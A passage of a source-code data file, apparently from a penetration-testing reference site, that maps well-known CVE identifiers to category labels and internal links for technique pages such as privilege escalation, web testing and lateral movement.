  'CVE-2022-0847': [{ label: 'Privilege Escalation', to: 'library/methodologies#privilege-escalation' }, { label: 'Kernel Exploits', to: 'technique/kernel-exploits' }],
  'CVE-2016-5195': [{ label: 'Privilege Escalation', to: 'library/methodologies#privilege-escalation' }, { label: 'Kernel Exploits', to: 'technique/kernel-exploits' }],
  'CVE-2014-6271': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }, { label: 'OWASP: Injection', to: 'library/owasp#injection' }],
  'CVE-2018-7600': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }, { label: 'CMS Attacks', to: 'technique/cms-specific-attacks' }],
  'CVE-2022-22965': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }],
  'CVE-2021-34473': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }],
  'CVE-2023-4966': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }, { label: 'OWASP: Auth Failures', to: 'library/owasp#auth-failures' }],
  'CVE-2021-42278': [{ label: 'AD Attack Path', to: 'library/methodologies#active-directory' }, { label: 'DCSync', to: 'technique/dcsync' }],
  'CVE-2023-34362': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }, { label: 'OWASP: Injection', to: 'library/owasp#injection' }],
  'CVE-2022-26134': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }, { label: 'OWASP: Injection', to: 'library/owasp#injection' }],
  'CVE-2021-3156': [{ label: 'Privilege Escalation', to: 'library/methodologies#privilege-escalation' }, { label: 'One-Shot Local Root', to: 'technique/one-shot-local-root-pwnkit-baron-samedit' }],
  'CVE-2014-0160': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }],
  'CVE-2021-41773': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }, { label: 'OWASP: Broken Access Control', to: 'library/owasp#broken-access-control' }],
  'CVE-2020-0796': [{ label: 'Lateral Movement', to: 'library/methodologies#lateral-movement' }, { label: 'Mimikatz', to: 'technique/mimikatz' }],
  'CVE-2021-22205': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }],
  'CVE-2021-36942': [{ label: 'NTLM Relay & Coercion', to: 'technique/ntlm-relay-coercion' }, { label: 'AD Attack Path', to: 'library/methodologies#active-directory' }, { label: 'DCSync', to: 'technique/dcsync' }],
  'CVE-2024-6387': [{ label: 'Payloads', to: 'library/payloads' }],
  'CVE-2024-3400': [{ label: 'Pivoting & Tunneling', to: 'technique/pivoting-tunneling' }, { label: 'Network PT', to: 'library/methodologies#enumeration-strategy' }],
  'CVE-2024-21887': [{ label: 'Pivoting & Tunneling', to: 'technique/pivoting-tunneling' }, { label: 'Lateral Movement', to: 'library/methodologies#lateral-movement' }],
  'CVE-2024-1709': [{ label: 'Lateral Movement', to: 'library/methodologies#lateral-movement' }],
  'CVE-2023-27350': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }],
  'CVE-2023-22515': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }, { label: 'OWASP: Broken Access Control', to: 'library/owasp#broken-access-control' }],
  'CVE-2023-3519': [{ label: 'Pivoting & Tunneling', to: 'technique/pivoting-tunneling' }],
  'CVE-2022-1388': [{ label: 'Pivoting & Tunneling', to: 'technique/pivoting-tunneling' }],
  'CVE-2023-20198': [{ label: 'Pivoting & Tunneling', to: 'technique/pivoting-tunneling' }],
  'CVE-2024-4577': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }, { label: 'OWASP: Injection', to: 'library/owasp#injection' }],
  'CVE-2024-23897': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }],
};
